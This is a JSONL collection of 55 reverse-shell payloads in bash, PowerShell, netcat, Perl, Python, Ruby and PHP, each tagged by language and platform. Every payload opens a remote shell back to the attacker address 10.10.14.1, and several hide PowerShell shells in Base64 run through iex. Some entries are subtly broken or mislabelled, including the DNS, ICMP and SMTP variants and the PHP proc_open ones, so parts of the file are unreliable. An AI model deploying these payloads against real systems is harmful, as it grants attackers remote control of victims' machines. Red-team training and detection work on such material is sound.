{"id":"rshell-001","language":"bash","payload":"bash -i >& /dev/tcp/10.10.14.1/4444 0>&1","description":"Basic Bash TCP reverse shell connecting to attacker host.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","bash"]}
{"id":"rshell-002","language":"powershell","payload":"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()","description":"PowerShell TCP reverse shell with persistent connection.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-003","language":"netcat","payload":"nc -e /bin/sh 10.10.14.1 4444","description":"Netcat TCP reverse shell executing a shell.","platform":"Linux","requires_netcat":true,"obfuscated":false,"tag":["tcp","netcat"]}
{"id":"rshell-004","language":"powershell","payload":"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjEnLDQ0NDQpOyRzPSRjLkdldFN0cmVhbSgpOyRiPVtCeXRlW11dOjpDcmVhdGVJbnN0YW5jZShbYnl0ZV0sNjU1MzUpO3doaWxlKCgkaT0kcy5SZWFkKCRiLDAsJGIuTGVuZ3RoKSktbmUgMCl7JGQ9W1N5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmddOjpHZXRTdHJpbmcoJGIscywkaSk7JG89KEludm9rZS1FeHByZXNzaW9uICRkIDI+JjF8T3V0LVN0cmluZyk7JHA9JG8rJ1BTICcrKEdldC1Mb2NhdGlvbikuUGF0aCsnPiAnOyRlPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRwKTskcy5Xcml0ZSgkZSw0LCRlLkxlbmd0aCk7JHMuRmx1c2goKX07JGMuQ2xvc2UoKQ=='))|iex","description":"Obfuscated PowerShell TCP reverse shell using Base64 encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated"]}
{"id":"rshell-005","language":"perl","payload":"perl -e 'use Socket;$i=\"10.10.14.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'","description":"Perl TCP reverse shell for Linux systems.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","perl"]}
{"id":"rshell-006","language":"powershell","payload":"$sm=(New-Object Net.Sockets.TCPClient('10.10.14.1',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(gl).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$sm.Write($sbt,0,$sbt.Length);$sm.Flush()}","description":"Compact PowerShell TCP reverse shell with minimal footprint.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-007","language":"python","payload":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'","description":"Python TCP reverse shell executing an interactive shell.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","python"]}
{"id":"rshell-008","language":"powershell","payload":"$u=[System.Net.Sockets.UdpClient]::new('10.10.14.1',4444);while($true){$b=[byte[]]::new(65535);$d=$u.Receive([ref]$b);$c=[System.Text.Encoding]::ASCII.GetString($b,0,$d.Length);$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Text.Encoding]::ASCII.GetBytes($o);$u.Send($r,$r.Length)}","description":"PowerShell UDP reverse shell for stealthy communication.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["udp","powershell"]}
{"id":"rshell-009","language":"bash","payload":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f","description":"Bash reverse shell using named pipe and Netcat.","platform":"Linux","requires_netcat":true,"obfuscated":false,"tag":["tcp","bash","netcat"]}
{"id":"rshell-010","language":"powershell","payload":"$x='JGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjEnLDQ0NDQpOyRzPSRjLkdldFN0cmVhbSgpOyRiPVtCeXRlW11dOjpDcmVhdGVJbnN0YW5jZShbYnl0ZV0sNjU1MzUpO3doaWxlKCgkaT0kcy5SZWFkKCRiLDAsJGIuTGVuZ3RoKSktbmUgMCl7JGQ9W1N5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmddOjpHZXRTdHJpbmcoJGIscywkaSk7JG89KEludm9rZS1FeHByZXNzaW9uICRkIDI+JjF8T3V0LVN0cmluZyk7JHA9JG8rJ1BTICcrKEdldC1Mb2NhdGlvbikuUGF0aCsnPiAnOyRlPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRwKTskcy5Xcml0ZSgkZSw0LCRlLkxlbmd0aCk7JHMuRmx1c2goKX07JGMuQ2xvc2UoKQ==';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x))|iex","description":"Obfuscated PowerShell TCP reverse shell using environment variables.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated"]}
{"id":"rshell-011","language":"ruby","payload":"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"10.10.14.1\",4444);loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~//)?c.puts(`$_`):c.puts(\"\");}'","description":"Ruby TCP reverse shell with command execution loop.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","ruby"]}
{"id":"rshell-012","language":"powershell","payload":"$s=New-Object System.Net.Sockets.TcpClient('10.10.14.1',4444);$t=$s.GetStream();$b=[byte[]]::CreateInstance([byte],65535);while(($r=$t.Read($b,0,$b.Length))-ne 0){$c=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$r);$o=(Invoke-Expression $c 2>&1|Out-String);$p=$o+'PS '+(Get-Location).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$t.Write($e,0,$e.Length);$t.Flush()};$s.Close()","description":"PowerShell TCP reverse shell with error handling.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-013","language":"netcat","payload":"nc -u 10.10.14.1 4444 -e /bin/bash","description":"Netcat UDP reverse shell executing bash.","platform":"Linux","requires_netcat":true,"obfuscated":false,"tag":["udp","netcat"]}
{"id":"rshell-014","language":"powershell","payload":"$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');while($true){$c=$w.DownloadString('http://10.10.14.1:8080/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$w.UploadString('http://10.10.14.1:8080/out',$o)}","description":"PowerShell HTTP reverse shell with command polling.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["http","powershell"]}
{"id":"rshell-015","language":"php","payload":"php -r '$sock=fsockopen(\"10.10.14.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'","description":"PHP TCP reverse shell using fsockopen.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","php"]}
{"id":"rshell-016","language":"powershell","payload":"$z=[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes('$c=New-Object Net.Sockets.TCPClient(\"10.10.14.1\",4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+\"PS \"+(pwd).Path+\"> \";$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()'));[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($z))|iex","description":"Obfuscated PowerShell TCP reverse shell using compressed Base64.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated"]}
{"id":"rshell-017","language":"bash","payload":"0<&196;exec 196<>/dev/tcp/10.10.14.1/4444; sh <&196 >&196 2>&196","description":"Bash TCP reverse shell using file descriptor redirection.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","bash"]}
{"id":"rshell-018","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with streamlined buffer handling.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-019","language":"python","payload":"python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024).decode();p=subprocess.Popen(d,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE);s.send(p.stdout.read()+p.stderr.read())'","description":"Python UDP reverse shell with subprocess execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["udp","python"]}
{"id":"rshell-020","language":"powershell","payload":"$d=[System.Net.Dns]::GetHostEntry('cmd.10.10.14.1');while($true){$c=[System.Net.Dns]::GetHostEntry('cmd.10.10.14.1').AddressList[0].IPAddressToString;$o=(Invoke-Expression $c 2>&1|Out-String);$r=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o));[System.Net.Dns]::GetHostEntry(\"$r.out.10.10.14.1\")}","description":"PowerShell DNS reverse shell using TXT record polling.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["dns","powershell"]}
{"id":"rshell-021","language":"perl","payload":"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.10.14.1:4444\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'","description":"Perl TCP reverse shell with forking for persistence.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","perl"]}
{"id":"rshell-022","language":"powershell","payload":"$tcp=New-Object Net.Sockets.TcpClient('10.10.14.1',4444);$str=$tcp.GetStream();$buf=New-Object Byte[] 65535;while(($len=$str.Read($buf,0,$buf.Length))-ne 0){$cmd=(New-Object Text.ASCIIEncoding).GetString($buf,0,$len);$out=(Invoke-Expression $cmd 2>&1|Out-String);$prompt=$out+'PS '+(Get-Location).Path+'> ';$bytes=([text.encoding]::ASCII).GetBytes($prompt);$str.Write($bytes,0,$bytes.Length);$str.Flush()};$tcp.Close()","description":"PowerShell TCP reverse shell with robust command execution.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-023","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'","description":"Bash TCP reverse shell using file descriptor for command execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","bash"]}
{"id":"rshell-024","language":"powershell","payload":"$k=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjEnLDQ0NDQpOyRzPSRjLkdldFN0cmVhbSgpOyRiPU5ldy1PYmplY3QgQnl0ZVtdIDY1NTM1O3doaWxlKCgkaT0kcy5SZWFkKCRiLDAsJGIuTGVuZ3RoKSktbmUgMCl7JGQ9KFtTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nXTo6R2V0U3RyaW5nKCRiLDAsJGkpKTskbz0oaWV4ICRkIDI+JjF8T3V0LVN0cmluZyk7JHA9JG8rJ1BTICcrKHB3ZCkuUGF0aCsnPiAnOyRlPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRwKTskcy5Xcml0ZSgkZSw0LCRlLkxlbmd0aCk7JHMuRmx1c2goKX07JGMuQ2xvc2UoKQ=='));iex $k","description":"Obfuscated PowerShell TCP reverse shell using registry-like encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated"]}
{"id":"rshell-025","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);loop{c.gets.chomp!;($_==\"exit\")?exit:c.puts(`$_`)}'","description":"Ruby TCP reverse shell with simple command loop.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","ruby"]}
{"id":"rshell-026","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;while($true){$cmd=$wc.DownloadString('http://10.10.14.1:8080/execute');$out=(Invoke-Expression $cmd 2>&1|Out-String);$wc.UploadString('http://10.10.14.1:8080/result', $out)}","description":"PowerShell HTTP reverse shell with periodic command fetching.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["http","powershell"]}
{"id":"rshell-027","language":"netcat","payload":"rm /tmp/p; mkfifo /tmp/p; nc 10.10.14.1 4444 0</tmp/p | /bin/sh >/tmp/p 2>&1","description":"Netcat TCP reverse shell using named pipe for communication.","platform":"Linux","requires_netcat":true,"obfuscated":false,"tag":["tcp","netcat"]}
{"id":"rshell-028","language":"powershell","payload":"$c=(New-Object Net.Sockets.TCPClient('10.10.14.1',4444)).GetStream();$b=New-Object Byte[] 65535;while(($i=$c.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$c.Write($e,0,$e.Length);$c.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with minimal resource usage.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-029","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);$p=popen(\"/bin/sh -i\",\"r\");while(!feof($p)){$l=fgets($p);fwrite($s,$l);};'","description":"PHP TCP reverse shell using popen for shell execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","php"]}
{"id":"rshell-030","language":"powershell","payload":"$ws=[System.Net.WebSockets.ClientWebSocket]::new();$ct=[System.Threading.CancellationToken]::new($false);$ws.ConnectAsync([System.Uri]::new('ws://10.10.14.1:8080'),$ct).Wait();while($ws.State -eq 'Open'){$b=New-Object Byte[] 65535;$m=New-Object System.ArraySegment[byte]($b);$r=$ws.ReceiveAsync($m,$ct).Result;$c=[System.Text.Encoding]::ASCII.GetString($b,0,$r.Count);$o=(iex $c 2>&1|Out-String);$e=[System.Text.Encoding]::ASCII.GetBytes($o);$ws.SendAsync([System.ArraySegment[byte]]::new($e),[System.Net.WebSockets.WebSocketMessageType]::Text,$true,$ct).Wait()}","description":"PowerShell WebSocket reverse shell for modern protocols.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["websocket","powershell"]}
{"id":"rshell-031","language":"python","payload":"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'","description":"Python TCP reverse shell with PTY for interactive terminal.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","python","pty"]}
{"id":"rshell-032","language":"powershell","payload":"$y=[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes('$c=New-Object Net.Sockets.TCPClient(\"10.10.14.1\",4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+\"PS \"+(pwd).Path+\"> \";$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()'));[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($y))|iex","description":"Obfuscated PowerShell TCP reverse shell using COM-like encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated"]}
{"id":"rshell-033","language":"bash","payload":"bash -i >& /dev/udp/10.10.14.1/4444 0>&1","description":"Bash UDP reverse shell for lightweight communication.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["udp","bash"]}
{"id":"rshell-034","language":"powershell","payload":"$t=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$t.GetStream();$b=New-Object Byte[] 65535;while(($r=$s.Read($b,0,$b.Length))-ne 0){$c=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);$o=(Invoke-Expression $c 2>&1|Out-String);$p=$o+'PS '+(Get-Location).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$t.Close()","description":"PowerShell TCP reverse shell with location-aware prompt.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-035","language":"perl","payload":"perl -e 'use Socket;$i=\"10.10.14.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'","description":"Perl TCP reverse shell with bash execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","perl","bash"]}
{"id":"rshell-036","language":"powershell","payload":"$p=[System.Net.NetworkInformation.Ping]::new();while($true){$c=$p.Send('10.10.14.1').RoundtripTime;$o=(Invoke-Expression $c 2>&1|Out-String);$b=[System.Text.Encoding]::ASCII.GetBytes($o);$p.Send('10.10.14.1',1000,$b)}","description":"PowerShell ICMP reverse shell for covert communication.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["icmp","powershell"]}
{"id":"rshell-037","language":"netcat","payload":"nc 10.10.14.1 4444 -e /bin/bash","description":"Netcat TCP reverse shell with direct bash execution.","platform":"Linux","requires_netcat":true,"obfuscated":false,"tag":["tcp","netcat","bash"]}
{"id":"rshell-038","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with stable connection handling.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-039","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'","description":"Ruby TCP reverse shell with piped command execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","ruby"]}
{"id":"rshell-040","language":"powershell","payload":"$v=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjEnLDQ0NDQpOyRzPSRjLkdldFN0cmVhbSgpOyRiPU5ldy1PYmplY3QgQnl0ZVtdIDY1NTM1O3doaWxlKCgkaT0kcy5SZWFkKCRiLDAsJGIuTGVuZ3RoKSktbmUgMCl7JGQ9KFtTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nXTo6R2V0U3RyaW5nKCRiLDAsJGkpKTskbz0oaWV4ICRkIDI+JjF8T3V0LVN0cmluZyk7JHA9JG8rJ1BTICcrKHB3ZCkuUGF0aCsnPiAnOyRlPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRwKTskcy5Xcml0ZSgkZSw0LCRlLkxlbmd0aCk7JHMuRmx1c2goKX07JGMuQ2xvc2UoKQ=='));iex $v","description":"Obfuscated PowerShell TCP reverse shell using dynamic variable names.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated"]}
{"id":"rshell-041","language":"php","payload":"php -r '$sock=fsockopen(\"10.10.14.1\",4444);$proc=proc_open(\"/bin/sh -i\",[0=>\"pipe\",\"r\",1=>\"pipe\",\"w\",2=>\"pipe\",\"w\"],$pipes);while(true){fwrite($pipes[0],fread($sock,1024));fwrite($sock,fread($pipes[1],1024));fwrite($sock,fread($pipes[2],1024));}'","description":"PHP TCP reverse shell with process piping.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","php"]}
{"id":"rshell-042","language":"powershell","payload":"$tcp=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$str=$tcp.GetStream();$buf=New-Object Byte[] 65535;while(($len=$str.Read($buf,0,$buf.Length))-ne 0){$cmd=(New-Object Text.ASCIIEncoding).GetString($buf,0,$len);$out=(Invoke-Expression $cmd 2>&1|Out-String);$prompt=$out+'PS '+(Get-Location).Path+'> ';$bytes=([text.encoding]::ASCII).GetBytes($prompt);$str.Write($bytes,0,$bytes.Length);$str.Flush()};$tcp.Close()","description":"PowerShell TCP reverse shell with efficient stream handling.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-043","language":"bash","payload":"bash -c 'sh -i >& /dev/tcp/10.10.14.1/4444 0>&1'","description":"Bash TCP reverse shell with explicit shell invocation.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","bash"]}
{"id":"rshell-044","language":"powershell","payload":"$m=[System.Net.Mail.SmtpClient]::new('10.10.14.1',25);while($true){$c='cmd'+(Get-Random);$o=(Invoke-Expression $c 2>&1|Out-String);$e=New-Object System.Net.Mail.MailMessage('a@b.c',$c,$o);$m.Send($e)}","description":"PowerShell SMTP reverse shell for covert exfiltration.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["smtp","powershell"]}
{"id":"rshell-045","language":"python","payload":"python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True: d=s.recv(1024).decode();p=os.popen(d);s.send(p.read().encode())'","description":"Python TCP reverse shell with popen command execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","python"]}
{"id":"rshell-046","language":"powershell","payload":"$e=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjEnLDQ0NDQpOyRzPSRjLkdldFN0cmVhbSgpOyRiPU5ldy1PYmplY3QgQnl0ZVtdIDY1NTM1O3doaWxlKCgkaT0kcy5SZWFkKCRiLDAsJGIuTGVuZ3RoKSktbmUgMCl7JGQ9KFtTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nXTo6R2V0U3RyaW5nKCRiLDAsJGkpKTskbz0oaWV4ICRkIDI+JjF8T3V0LVN0cmluZyk7JHA9JG8rJ1BTICcrKHB3ZCkuUGF0aCsnPiAnOyRlPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRwKTskcy5Xcml0ZSgkZSw0LCRlLkxlbmd0aCk7JHMuRmx1c2goKX07JGMuQ2xvc2UoKQ=='));iex $e","description":"Obfuscated PowerShell TCP reverse shell using encoded commands.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated"]}
{"id":"rshell-047","language":"netcat","payload":"nc -u 10.10.14.1 4444 -e /bin/sh","description":"Netcat UDP reverse shell with direct shell execution.","platform":"Linux","requires_netcat":true,"obfuscated":false,"tag":["udp","netcat"]}
{"id":"rshell-048","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with consistent output formatting.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-049","language":"perl","payload":"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.10.14.1\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'","description":"Perl TCP reverse shell with streamlined socket setup.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","perl"]}
{"id":"rshell-050","language":"powershell","payload":"$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/cmd');while($true){$f.Method=[System.Net.WebRequestMethods+Ftp]::DownloadFile;$r=$f.GetResponse();$s=$r.GetResponseStream();$b=New-Object IO.StreamReader($s);$c=$b.ReadToEnd();$o=(iex $c 2>&1|Out-String);$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/out');$f.Method=[System.Net.WebRequestMethods+Ftp]::UploadFile;$w=$f.GetRequestStream();$w.Write([System.Text.Encoding]::ASCII.GetBytes($o),0,$o.Length);$w.Close()}","description":"PowerShell FTP reverse shell for data exfiltration.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["ftp","powershell"]}
{"id":"rshell-051","language":"bash","payload":"bash -c 'exec 3<>/dev/tcp/10.10.14.1/4444;while read line <&3;do $line >&3 2>&3;done'","description":"Bash TCP reverse shell using file descriptor loop.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","bash"]}
{"id":"rshell-052","language":"powershell","payload":"$t=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$t.GetStream();$b=New-Object Byte[] 65535;while(($r=$s.Read($b,0,$b.Length))-ne 0){$c=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);$o=(Invoke-Expression $c 2>&1|Out-String);$p=$o+'PS '+(Get-Location).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$t.Close()","description":"PowerShell TCP reverse shell with optimized buffer size.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-053","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);loop{c.gets.chomp!;($_==\"exit\")?exit:c.puts(`$_`)}'","description":"Ruby TCP reverse shell with exit condition.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","ruby"]}
{"id":"rshell-054","language":"powershell","payload":"$wmi=[WmiClass]'Win32_Process';$cmd='JGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjEnLDQ0NDQpOyRzPSRjLkdldFN0cmVhbSgpOyRiPU5ldy1PYmplY3QgQnl0ZVtdIDY1NTM1O3doaWxlKCgkaT0kcy5SZWFkKCRiLDAsJGIuTGVuZ3RoKSktbmUgMCl7JGQ9KFtTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nXTo6R2V0U3RyaW5nKCRiLDAsJGkpKTskbz0oaWV4ICRkIDI+JjF8T3V0LVN0cmluZyk7JHA9JG8rJ1BTICcrKHB3ZCkuUGF0aCsnPiAnOyRlPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRwKTskcy5Xcml0ZSgkZSw0LCRlLkxlbmd0aCk7JHMuRmx1c2goKX07JGMuQ2xvc2UoKQ==';$wmi.Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd)))","description":"Obfuscated PowerShell TCP reverse shell using WMI events.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated"]}
{"id":"rshell-055","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);while($c=fgets($s)){system($c,$o);fwrite($s,$o);}'","description":"PHP TCP reverse shell with system command execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","php"]}
